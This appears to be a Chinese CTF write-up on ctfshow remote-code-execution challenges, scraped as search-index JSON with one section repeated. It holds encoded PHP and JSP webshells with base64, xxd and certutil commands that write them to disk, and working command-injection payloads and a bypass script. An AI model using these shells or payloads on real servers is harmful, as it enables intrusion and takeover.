PCVAcGFnZSBpbXBvcnQ9ImphdmEudXRpbC4qLGphdmF4LmNyeXB0by4qLGphdmF4LmNyeXB0by5zcGVjLioiJT48JSFjbGFzcyBVIGV4dGVuZHMgQ2xhc3NMb2FkZXJ7VShDbGFzc0xvYWRlciBjKXtzdXBlcihjKTt9cHVibGljIENsYXNzIGcoYnl0ZSBbXWIpe3JldHVybiBzdXBlci5kZWZpbmVDbGFzcyhiLDAsYi5sZW5ndGgpO319JT48JWlmIChyZXF1ZXN0LmdldE1ldGhvZCgpLmVxdWFscygiUE9TVCIpKXtTdHJpbmcgaz0iZTQ1ZTMyOWZlYjVkOTI1YiI7c2Vzc2lvbi5wdXRWYWx1ZSgidSIsayk7Q2lwaGVyIGM9Q2lwaGVyLmdldEluc3RhbmNlKCJBRVMiKTtjLmluaXQoMixuZXcgU2VjcmV0S2V5U3BlYyhrLmdldEJ5dGVzKCksIkFFUyIpKTtuZXcgVSh0aGlzLmdldENsYXNzKCkuZ2V0Q2xhc3NMb2FkZXIoKSkuZyhjLmRvRmluYWwobmV3IHN1bi5taXNjLkJBU0U2NERlY29kZXIoKS5kZWNvZGVCdWZmZXIocmVxdWVzdC5nZXRSZWFkZXIoKS5yZWFkTGluZSgpKSkpLm5ld0luc3RhbmNlKCkuZXF1YWxzKHBhZ2VDb250ZXh0KTt9JT4= \u003e 123.txt 再通过certuti进行解码 certutil -f -decode 111.txt C:\\\\111.jsp certutil-Hex echo 3c25407061676520696d706f72743d226a6176612e7574696c2e2a2c6a617661782e63727970746f2e2a2c6a617661782e63727970746f2e737065632e2a22253e3c2521636c617373205520657874656e647320436c6173734c6f616465727b5528436c6173734c6f616465722063297b73757065722863293b7d7075626c696320436c61737320672862797465205b5d62297b72657475726e2073757065722e646566696e65436c61737328622c302c622e6c656e677468293b7d7d253e3c2569662028726571756573742e6765744d6574686f6428292e657175616c732822504f53542229297b537472696e67206b3d2265343565333239666562356439323562223b73657373696f6e2e70757456616c7565282275222c6b293b43697068657220633d4369706865722e676574496e7374616e6365282241455322293b632e696e697428322c6e6577205365637265744b657953706563286b2e676574427974657328292c224145532229293b6e6577205528746869732e676574436c61737328292e676574436c6173734c6f616465722829292e6728632e646f46696e616c286e65772073756e2e6d6973632e4241534536344465636f64657228292e6465636f646542756666657228726571756573742e67657452656164657228292e726561644c696e6528292929292e6e6577496e7374616e636528292e657175616c732870616765436f6e74657874293b7d253e \u003e 111.txt 再通过certuti进行解码 certutil -decodehex 111.txt C:\\\\111.jsp ","date":"2023-11-17","objectID":"/ctfshow_rce/:21:2","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#转换编码写入"},{"categories":["CTF","web"],"content":"\r转换编码写入\rLinuxbase64方式写入： echo \"PD9waHAgZXZhbCgkX1BPU1RbMV0pOyA/Pg==\" | base64 -d \u003e2.php hex方式写入： hex写入与base64写入相似，在 https://www.107000.com/T-Hex/将webshell编码成hex，使用xxd命令还原 或在使用前将webshell使用xxd生成hex数据 echo '\u003c?php eval($_POST[1]); ?\u003e' |xxd -ps 然后命令注入执行 echo 3C3F706870206576616C28245F504F53545B315D293B203F3E|xxd -r -ps \u003e 3.php windows在windows中转换方法，是通过certutil进行转换。下面是base64以及hex的转换方式 certutil-Base64 echo PCVAcGFnZSBpbXBvcnQ9ImphdmEudXRpbC4qLGphdmF4LmNyeXB0by4qLGphdmF4LmNyeXB0by5zcGVjLioiJT48JSFjbGFzcyBVIGV4dGVuZHMgQ2xhc3NMb2FkZXJ7VShDbGFzc0xvYWRlciBjKXtzdXBlcihjKTt9cHVibGljIENsYXNzIGcoYnl0ZSBbXWIpe3JldHVybiBzdXBlci5kZWZpbmVDbGFzcyhiLDAsYi5sZW5ndGgpO319JT48JWlmIChyZXF1ZXN0LmdldE1ldGhvZCgpLmVxdWFscygiUE9TVCIpKXtTdHJpbmcgaz0iZTQ1ZTMyOWZlYjVkOTI1YiI7c2Vzc2lvbi5wdXRWYWx1ZSgidSIsayk7Q2lwaGVyIGM9Q2lwaGVyLmdldEluc3RhbmNlKCJBRVMiKTtjLmluaXQoMixuZXcgU2VjcmV0S2V5U3BlYyhrLmdldEJ5dGVzKCksIkFFUyIpKTtuZXcgVSh0aGlzLmdldENsYXNzKCkuZ2V0Q2xhc3NMb2FkZXIoKSkuZyhjLmRvRmluYWwobmV3IHN1bi5taXNjLkJBU0U2NERlY29kZXIoKS5kZWNvZGVCdWZmZXIocmVxdWVzdC5nZXRSZWFkZXIoKS5yZWFkTGluZSgpKSkpLm5ld0luc3RhbmNlKCkuZXF1YWxzKHBhZ2VDb250ZXh0KTt9JT4= \u003e 123.txt 再通过certuti进行解码 certutil -f -decode 111.txt C:\\\\111.jsp certutil-Hex echo 3c25407061676520696d706f72743d226a6176612e7574696c2e2a2c6a617661782e63727970746f2e2a2c6a617661782e63727970746f2e737065632e2a22253e3c2521636c617373205520657874656e647320436c6173734c6f616465727b5528436c6173734c6f616465722063297b73757065722863293b7d7075626c696320436c61737320672862797465205b5d62297b72657475726e2073757065722e646566696e65436c61737328622c302c622e6c656e677468293b7d7d253e3c2569662028726571756573742e6765744d6574686f6428292e657175616c732822504f53542229297b537472696e67206b3d2265343565333239666562356439323562223b73657373696f6e2e70757456616c7565282275222c6b293b43697068657220633d4369706865722e676574496e7374616e6365282241455322293b632e696e697428322c6e6577205365637265744b657953706563286b2e676574427974657328292c224145532229293b6e6577205528746869732e676574436c61737328292e676574436c6173734c6f616465722829292e6728632e646f46696e616c286e65772073756e2e6d6973632e4241534536344465636f64657228292e6465636f646542756666657228726571756573742e67657452656164657228292e726561644c696e6528292929292e6e6577496e7374616e636528292e657175616c732870616765436f6e74657874293b7d253e \u003e 111.txt 再通过certuti进行解码 certutil -decodehex 111.txt C:\\\\111.jsp ","date":"2023-11-17","objectID":"/ctfshow_rce/:21:2","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#linux-1"},{"categories":["CTF","web"],"content":"\r转换编码写入\rLinuxbase64方式写入： echo \"PD9waHAgZXZhbCgkX1BPU1RbMV0pOyA/Pg==\" | base64 -d \u003e2.php hex方式写入： hex写入与base64写入相似，在 https://www.107000.com/T-Hex/将webshell编码成hex，使用xxd命令还原 或在使用前将webshell使用xxd生成hex数据 echo '\u003c?php eval($_POST[1]); ?\u003e' |xxd -ps 然后命令注入执行 echo 3C3F706870206576616C28245F504F53545B315D293B203F3E|xxd -r -ps \u003e 3.php windows在windows中转换方法，是通过certutil进行转换。下面是base64以及hex的转换方式 certutil-Base64 echo PCVAcGFnZSBpbXBvcnQ9ImphdmEudXRpbC4qLGphdmF4LmNyeXB0by4qLGphdmF4LmNyeXB0by5zcGVjLioiJT48JSFjbGFzcyBVIGV4dGVuZHMgQ2xhc3NMb2FkZXJ7VShDbGFzc0xvYWRlciBjKXtzdXBlcihjKTt9cHVibGljIENsYXNzIGcoYnl0ZSBbXWIpe3JldHVybiBzdXBlci5kZWZpbmVDbGFzcyhiLDAsYi5sZW5ndGgpO319JT48JWlmIChyZXF1ZXN0LmdldE1ldGhvZCgpLmVxdWFscygiUE9TVCIpKXtTdHJpbmcgaz0iZTQ1ZTMyOWZlYjVkOTI1YiI7c2Vzc2lvbi5wdXRWYWx1ZSgidSIsayk7Q2lwaGVyIGM9Q2lwaGVyLmdldEluc3RhbmNlKCJBRVMiKTtjLmluaXQoMixuZXcgU2VjcmV0S2V5U3BlYyhrLmdldEJ5dGVzKCksIkFFUyIpKTtuZXcgVSh0aGlzLmdldENsYXNzKCkuZ2V0Q2xhc3NMb2FkZXIoKSkuZyhjLmRvRmluYWwobmV3IHN1bi5taXNjLkJBU0U2NERlY29kZXIoKS5kZWNvZGVCdWZmZXIocmVxdWVzdC5nZXRSZWFkZXIoKS5yZWFkTGluZSgpKSkpLm5ld0luc3RhbmNlKCkuZXF1YWxzKHBhZ2VDb250ZXh0KTt9JT4= \u003e 123.txt 再通过certuti进行解码 certutil -f -decode 111.txt C:\\\\111.jsp certutil-Hex echo 3c25407061676520696d706f72743d226a6176612e7574696c2e2a2c6a617661782e63727970746f2e2a2c6a617661782e63727970746f2e737065632e2a22253e3c2521636c617373205520657874656e647320436c6173734c6f616465727b5528436c6173734c6f616465722063297b73757065722863293b7d7075626c696320436c61737320672862797465205b5d62297b72657475726e2073757065722e646566696e65436c61737328622c302c622e6c656e677468293b7d7d253e3c2569662028726571756573742e6765744d6574686f6428292e657175616c732822504f53542229297b537472696e67206b3d2265343565333239666562356439323562223b73657373696f6e2e70757456616c7565282275222c6b293b43697068657220633d4369706865722e676574496e7374616e6365282241455322293b632e696e697428322c6e6577205365637265744b657953706563286b2e676574427974657328292c224145532229293b6e6577205528746869732e676574436c61737328292e676574436c6173734c6f616465722829292e6728632e646f46696e616c286e65772073756e2e6d6973632e4241534536344465636f64657228292e6465636f646542756666657228726571756573742e67657452656164657228292e726561644c696e6528292929292e6e6577496e7374616e636528292e657175616c732870616765436f6e74657874293b7d253e \u003e 111.txt 再通过certuti进行解码 certutil -decodehex 111.txt C:\\\\111.jsp ","date":"2023-11-17","objectID":"/ctfshow_rce/:21:2","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#windows-1"},{"categories":["CTF","web"],"content":"\r靶场题目：","date":"2023-11-17","objectID":"/ctfshow_rce/:22:0","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#靶场题目"},{"categories":["CTF","web"],"content":"\r[web29] \u003c?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-04 00:12:34 # @Last Modified by: h1xa # @Last Modified time: 2020-09-04 00:26:48 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ error_reporting(0); if(isset($_GET['c'])){ $c = $_GET['c']; if(!preg_match(\"/flag/i\", $c)){ eval($c); } }else{ highlight_file(__FILE__); } http://96a7197f-4b7a-43d0-90d4-2d4dee96ae95.challenge.ctf.show/?c=system('ls /'); http://96a7197f-4b7a-43d0-90d4-2d4dee96ae95.challenge.ctf.show/?c=system('ls /var/www/html/'); 由于flag字符串被过滤了，正则当中i用来不区分大小写，则可以构造 http://96a7197f-4b7a-43d0-90d4-2d4dee96ae95.challenge.ctf.show/?c=system('tac /var/www/html/fla*.php'); ","date":"2023-11-17","objectID":"/ctfshow_rce/:22:1","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#web29"},{"categories":["CTF","web"],"content":"\r[web30] \u003c?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-04 00:12:34 # @Last Modified by: h1xa # @Last Modified time: 2020-09-04 00:42:26 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ error_reporting(0); if(isset($_GET['c'])){ $c = $_GET['c']; if(!preg_match(\"/flag|system|php/i\", $c)){ eval($c); } }else{ highlight_file(__FILE__); } system被过滤，可通过编码绕过，如escape ascii with hex 构造url如下： http://b944f8f2-1f79-425e-a724-3be899d1b02c.challenge.ctf.show/?c=\"\\163\\171\\163\\164\\145\\155\"('ls /'); http://b944f8f2-1f79-425e-a724-3be899d1b02c.challenge.ctf.show/?c=\"\\163\\171\\163\\164\\145\\155\"('tac /var/www/html/fla*.ph*'); ","date":"2023-11-17","objectID":"/ctfshow_rce/:22:2","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#web30"},{"categories":["CTF","web"],"content":"\r[web31] \u003c?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-04 00:12:34 # @Last Modified by: h1xa # @Last Modified time: 2020-09-04 00:49:10 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ error_reporting(0); if(isset($_GET['c'])){ $c = $_GET['c']; if(!preg_match(\"/flag|system|php|cat|sort|shell|\\.| |\\'/i\", $c)){ eval($c); } }else{ highlight_file(__FILE__); } 通过嵌套eval来绕过 http://d7fd57e8-f61b-48fb-90b9-457bc707aae9.challenge.ctf.show/?c=eval($_GET[1]);\u00261=system('tac /var/www/html/flag.php'); ","date":"2023-11-17","objectID":"/ctfshow_rce/:22:3","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#web31"},{"categories":["CTF","web"],"content":"\r[web32~web36] \u003c?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-04 00:12:34 # @Last Modified by: h1xa # @Last Modified time: 2020-09-04 00:56:31 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ error_reporting(0); if(isset($_GET['c'])){ $c = $_GET['c']; if(!preg_match(\"/flag|system|php|cat|sort|shell|\\.| |\\'|\\`|echo|\\;|\\(/i\", $c)){ eval($c); } }else{ highlight_file(__FILE__); } 这次括号也被过滤了，include可以不用括号，分号可以用?\u003e代替 http://15871fe9-df00-4f7b-8e90-3e2b3618b395.challenge.ctf.show/?c=include$_GET[a]?\u003e\u0026a=php://filter/read=convert.base64-encode/resource=flag.php 然后base64解码即可得到flag内容 (web32~web36都可以用此payload) ","date":"2023-11-17","objectID":"/ctfshow_rce/:22:4","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#web32web36"},{"categories":["CTF","web"],"content":"\r[web37]文件包含 \u003c?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-04 00:12:34 # @Last Modified by: h1xa # @Last Modified time: 2020-09-04 05:18:55 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ //flag in flag.php error_reporting(0); if(isset($_GET['c'])){ $c = $_GET['c']; if(!preg_match(\"/flag/i\", $c)){ include($c); echo $flag; } }else{ highlight_file(__FILE__); } 使用data伪协议(由于过滤了flag使用占位符) ?c=data://text/plain, http://20afd377-c254-4c83-9656-761eccc0bda5.challenge.ctf.show/?c=data://text/palin,\u003c?php system('tac fla?.php');?\u003e ","date":"2023-11-17","objectID":"/ctfshow_rce/:22:5","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#web37文件包含"},{"categories":["CTF","web"],"content":"\r[web38] \u003c?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-04 00:12:34 # @Last Modified by: h1xa # @Last Modified time: 2020-09-04 05:23:36 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ //flag in flag.php error_reporting(0); if(isset($_GET['c'])){ $c = $_GET['c']; if(!preg_match(\"/flag|php|file/i\", $c)){ include($c); echo $flag; } }else{ highlight_file(__FILE__); } 多过滤了php和file，可以继续使用data协议不过是base64编码或者用\u003c?= ?\u003e来代替php http://3db62a04-22a9-4cf4-8990-684d55c8e05e.challenge.ctf.show/?c=data://text/palin,\u003c?=system('tac fla?.???');?\u003e ","date":"2023-11-17","objectID":"/ctfshow_rce/:22:6","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#web38"},{"categories":["CTF","web"],"content":"\r[web39] \u003c?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-04 00:12:34 # @Last Modified by: h1xa # @Last Modified time: 2020-09-04 06:13:21 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ //flag in flag.php error_reporting(0); if(isset($_GET['c'])){ $c = $_GET['c']; if(!preg_match(\"/flag/i\", $c)){ include($c.\".php\"); } }else{ highlight_file(__FILE__); } 在文件包含的时候会在后边加.php，使用web38的payload后边加上//就可以了 http://d0f68156-270b-4b09-9858-96cdfcb60a6f.challenge.ctf.show/?c=data://text/palin,\u003c?=system('tac fla?.???');?\u003e// ","date":"2023-11-17","objectID":"/ctfshow_rce/:22:7","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#web39"},{"categories":["CTF","web"],"content":"\r[web40] \u003c?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-04 00:12:34 # @Last Modified by: h1xa # @Last Modified time: 2020-09-04 06:03:36 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ if(isset($_GET['c'])){ $c = $_GET['c']; if(!preg_match(\"/[0-9]|\\~|\\`|\\@|\\#|\\\\$|\\%|\\^|\\\u0026|\\*|\\（|\\）|\\-|\\=|\\+|\\{|\\[|\\]|\\}|\\:|\\'|\\\"|\\,|\\\u003c|\\.|\\\u003e|\\/|\\?|\\\\\\\\/i\", $c)){ eval($c); } }else{ highlight_file(__FILE__); } payload1 http://c8c8e348-2afc-4708-974f-6397d6a41122.challenge.ctf.show/?c=eval(next(reset(get_defined_vars())));\u00261=;system(\"tac%20flag.php\"); get_defined_vars() 函数返回当前作用域中的所有已定义变量的数组。 reset() 函数将数组指针重置为第一个元素，并返回该元素的值。 next() 函数将指针移动到数组的下一个元素，并返回该元素的值。 eval() 函数将返回的值作为字符串进行评估，即执行该字符串作为PHP代码。 payload2 http://c8c8e348-2afc-4708-974f-6397d6a41122.challenge.ctf.show/?c=echo highlight_file(next(array_reverse(scandir(pos(localeconv()))))); localeconv() 函数返回包含本地化设置的数组。 pos() 函数返回数组的当前元素。 scandir() 函数返回指定目录中的文件和目录列表。 array_reverse() 函数将文件和目录列表按相反的顺序重新排列。 next() 函数将指针移动到数组的下一个元素，并返回该元素的值。 highlight_file() 函数接受返回的文件路径，并以HTML格式高亮显示该文件的内容。 echo 语句将高亮显示的文件内容输出到浏览器。 ","date":"2023-11-17","objectID":"/ctfshow_rce/:22:8","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#web40"},{"categories":["CTF","web"],"content":"\r[web41]过滤了基本上所有的可见字符，但没有过滤或运算符|和双引号” 可以使用或运算构造字符 这里也是直接用了佬写的脚本 通过修改脚本中的参数直接获取flag pythonimport re import requests url=\"http://8c9b5cd2-3f92-4451-a610-c30153b6063d.challenge.ctf.show/\" a=[] ans1=\"\" ans2=\"\" for i in range(0,256): c=chr(i) tmp = re.match(r'[0-9]|[a-z]|\\^|\\+|\\~|\\$|\\[|\\]|\\{|\\}|\\\u0026|\\-',c, re.I) if(tmp): continue #print(tmp.group(0)) else: a.append(i) # eval(\"echo($c);\"); mya=\"system\" #函数名 这里修改！ myb=\"tac flag.php\" #参数 def myfun(k,my): global ans1 global ans2 for i in range (0,len(a)): for j in range(i,len(a)): if(a[i]|a[j]==ord(my[k])): ans1+=chr(a[i]) ans2+=chr(a[j]) return; for k in range(0,len(mya)): myfun(k,mya) data1=\"(\\\"\"+ans1+\"\\\"|\\\"\"+ans2+\"\\\")\" ans1=\"\" ans2=\"\" for k in range(0,len(myb)): myfun(k,myb) data2=\"(\\\"\"+ans1+\"\\\"|\\\"\"+ans2+\"\\\")\" data={\"c\":data1+data2} r=requests.post(url=url,data=data) print(r.text) ","date":"2023-11-17","objectID":"/ctfshow_rce/:22:9","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#web41"},{"categories":["CTF","web"],"content":"\r[web42] \u003c?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-05 20:49:30 # @Last Modified by: h1xa # @Last Modified time: 2020-09-05 20:51:55 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ if(isset($_GET['c'])){ $c=$_GET['c']; system($c.\" \u003e/dev/null 2\u003e\u00261\"); }else{ highlight_file(__FILE__); } system($c.\" \u003e/dev/null 2\u003e\u00261\");: system() 函数用于执行操作系统命令。在这里，它执行了一个由变量$c组成的命令。\u003e/dev/null 是一个重定向操作符，用于将命令输出重定向到空设备（即丢弃输出）。2\u003e\u00261 是将标准错误输出重定向到与标准输出相同的位置。这样做的目的通常是隐藏命令的输出。 /dev/null 2\u003e\u00261是不进行回显，所以采用命令把flag打印出来，利用；分隔分化一下 构造payload： http://69d3026b-8d3d-465d-9e88-de78c94b2173.challenge.ctf.show/?c=tac flag.php; ","date":"2023-11-17","objectID":"/ctfshow_rce/:22:10","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#web42"},{"categories":["CTF","web"],"content":"\r[web43] \u003c?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-05 20:49:30 # @Last Modified by: h1xa # @Last Modified time: 2020-09-05 21:32:51 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ if(isset($_GET['c'])){ $c=$_GET['c']; if(!preg_match(\"/\\;|cat/i\", $c)){ system($c.\" \u003e/dev/null 2\u003e\u00261\"); } }else{ highlight_file(__FILE__); } 过滤的分号;和cat 过滤分号可以用||来绕过，也可以用%0a 构造payload： http://86675d5f-84b3-463e-b502-aa45872d35e5.challenge.ctf.show/?c=tac flag*%0a ","date":"2023-11-17","objectID":"/ctfshow_rce/:22:11","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#web43"},{"categories":["CTF","web"],"content":"\r[web44] \u003c?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-05 20:49:30 # @Last Modified by: h1xa # @Last Modified time: 2020-09-05 21:32:01 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ if(isset($_GET['c'])){ $c=$_GET['c']; if(!preg_match(\"/;|cat|flag/i\", $c)){ system($c.\" \u003e/dev/null 2\u003e\u00261\"); } }else{ highlight_file(__FILE__); } payload: http://74f7b3e3-07ef-4406-92ce-50ef4a1b36b2.challenge.ctf.show/?c=tac fla*%0a ","date":"2023-11-17","objectID":"/ctfshow_rce/:22:12","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#web44"},{"categories":["CTF","web"],"content":"\r[web45] \u003c?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-05 20:49:30 # @Last Modified by: h1xa # @Last Modified time: 2020-09-05 21:35:34 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ if(isset($_GET['c'])){ $c=$_GET['c']; if(!preg_match(\"/\\;|cat|flag| /i\", $c)){ system($c.\" \u003e/dev/null 2\u003e\u00261\"); } }else{ highlight_file(__FILE__); } 在之前的过滤基础上，把空格过滤了，所以可以采用“tab”但是直接按tab键会使光标跳到分隔符之后或者跳在历史记录中的下一条记录 所以采用tab的url编码%09 http://36a28485-8f30-45c2-8609-9961e849c7d9.challenge.ctf.show/?c=tac%09fla*|| ","date":"2023-11-17","objectID":"/ctfshow_rce/:22:13","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#web45"},{"categories":["CTF","web"],"content":"\r[web46] \u003c?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-05 20:49:30 # @Last Modified by: h1xa # @Last Modified time: 2020-09-05 21:50:19 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ if(isset($_GET['c'])){ $c=$_GET['c']; if(!preg_match(\"/\\;|cat|flag| |[0-9]|\\\\$|\\*/i\", $c)){ system($c.\" \u003e/dev/null 2\u003e\u00261\"); } }else{ highlight_file(__FILE__); } payload: http://fbf393b9-61e3-424c-a868-ed9427f3231e.challenge.ctf.show/?c=tac%09fla%27%27g.php|| ","date":"2023-11-17","objectID":"/ctfshow_rce/:22:14","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#web46"},{"categories":["CTF","web"],"content":"\r[web47] \u003c?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-05 20:49:30 # @Last Modified by: h1xa # @Last Modified time: 2020-09-05 21:59:23 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ if(isset($_GET['c'])){ $c=$_GET['c']; if(!preg_match(\"/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail/i\", $c)){ system($c.\" \u003e/dev/null 2\u003e\u00261\"); } }else{ highlight_file(__FILE__); } 这次又多过滤了more，less，head，sort，tail more:一页一页的显示档案内容 less:与 more 类似 head:查看头几行 tac:从最后一行开始显示，可以看出 tac 是cat 的反向显示 tail:查看尾几行 nl：显示的时候，顺便输出行号 od:以二进制的方式读取档案内容 vi:一种编辑器，这个也可以查看 vim:一种编辑器，这个也可以查看 sort:可以查看 uniq:可以查看 file -f:报错出具体内容 grep:在当前目录中，查找后缀有 file 字样的文件中包含 test 字符串的文件，并打印出该字符串的行。此时，可以使用如下命令： grep test *file strings payload： http://25de6835-dd96-4a50-83af-50fa48cfa1f4.challenge.ctf.show/?c=tac%09fla?.php|| ","date":"2023-11-17","objectID":"/ctfshow_rce/:22:15","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#web47"},{"categories":["CTF","web"],"content":"\r[web48] \u003c?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-05 20:49:30 # @Last Modified by: h1xa # @Last Modified time: 2020-09-05 22:06:20 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ if(isset($_GET['c'])){ $c=$_GET['c']; if(!preg_match(\"/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\\`/i\", $c)){ system($c.\" \u003e/dev/null 2\u003e\u00261\"); } }else{ highlight_file(__FILE__); } payload： http://fcd9b6a0-166f-483d-b987-2691fda042b2.challenge.ctf.show/?c=tac%09fla?.php|| [web49]跟48差不多 ","date":"2023-11-17","objectID":"/ctfshow_rce/:22:16","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#web48"},{"categories":["CTF","web"],"content":"\r[web50] \u003c?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-05 20:49:30 # @Last Modified by: h1xa # @Last Modified time: 2020-09-05 22:32:47 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ if(isset($_GET['c'])){ $c=$_GET['c']; if(!preg_match(\"/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail|sed|cut|awk|strings|od|curl|\\`|\\%|\\x09|\\x26/i\", $c)){ system($c.\" \u003e/dev/null 2\u003e\u00261\"); } }else{ highlight_file(__FILE__); } payload: http://14f16d04-b94e-4a71-81d9-0b3a691de2a9.challenge.ctf.show/?c=tac\u003cfl''ag.php|| ","date":"2023-11-17","objectID":"/ctfshow_rce/:22:17","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#web50"},{"categories":["CTF","web"],"content":"\r[web51] \u003c?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-05 20:49:30 # @Last Modified by: h1xa # @Last Modified time: 2020-09-05 22:42:52 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ if(isset($_GET['c'])){ $c=$_GET['c']; if(!preg_match(\"/\\;|cat|flag| |[0-9]|\\\\$|\\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\\`|\\%|\\x09|\\x26/i\", $c)){ system($c.\" \u003e/dev/null 2\u003e\u00261\"); } }else{ highlight_file(__FILE__); } 又过滤了tac等，可以使用ta‘’c payload： http://efdac68a-4d21-4a65-b7bf-cbc9f8f0f7b9.challenge.ctf.show?c=ta''c\u003cfla''g.php|| ","date":"2023-11-17","objectID":"/ctfshow_rce/:22:18","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#web51"},{"categories":["CTF","web"],"content":"\r[web52] \u003c?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-05 20:49:30 # @Last Modified by: h1xa # @Last Modified time: 2020-09-05 22:50:30 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ if(isset($_GET['c'])){ $c=$_GET['c']; if(!preg_match(\"/\\;|cat|flag| |[0-9]|\\*|more|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\\`|\\%|\\x09|\\x26|\\\u003e|\\\u003c/i\", $c)){ system($c.\" \u003e/dev/null 2\u003e\u00261\"); } }else{ highlight_file(__FILE__); } payload: http://a48d624c-f414-43b1-8bfa-238d060672de.challenge.ctf.show/?c=ls${IFS}/|| http://a48d624c-f414-43b1-8bfa-238d060672de.challenge.ctf.show/?c=ta''c${IFS}/fla''g|| ","date":"2023-11-17","objectID":"/ctfshow_rce/:22:19","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#web52"},{"categories":["CTF","web"],"content":"\r[web53] \u003c?php /* # -*- coding: utf-8 -*- # @Author: h1xa # @Date: 2020-09-05 20:49:30 # @Last Modified by: h1xa # @Last Modified time: 2020-09-07 18:21:02 # @email: h1xa@ctfer.com # @link: https://ctfer.com */ if(isset($_GET['c'])){ $c=$_GET['c']; if(!preg_match(\"/\\;|cat|flag| |[0-9]|\\*|more|wget|less|head|sort|tail|sed|cut|tac|awk|strings|od|curl|\\`|\\%|\\x09|\\x26|\\\u003e|\\\u003c/i\", $c)){ echo($c); $d = system($c); echo \"\u003cbr\u003e\".$d; }else{ echo 'no'; } }else{ highlight_file(__FILE__); } payload: http://009c1d7c-5a7a-44a5-8a5c-9fdea5fa3cac.challenge.ctf.show/?c=ta''c${IFS}fla''g.php ","date":"2023-11-17","objectID":"/ctfshow_rce/:22:20","series":null,"tags":["CTF","web"],"title":"ctfshow_rce","uri":"/ctfshow_rce/#web53"},{"categories":["CTF","web"],"content":"\r[web54] \u003c?php if(isset($_GET['c'])){ $c=$_GET['c']; if(!preg_match(\"/\\;|.*c.*a.*t.*|.*f.*l.*a.*g.*| 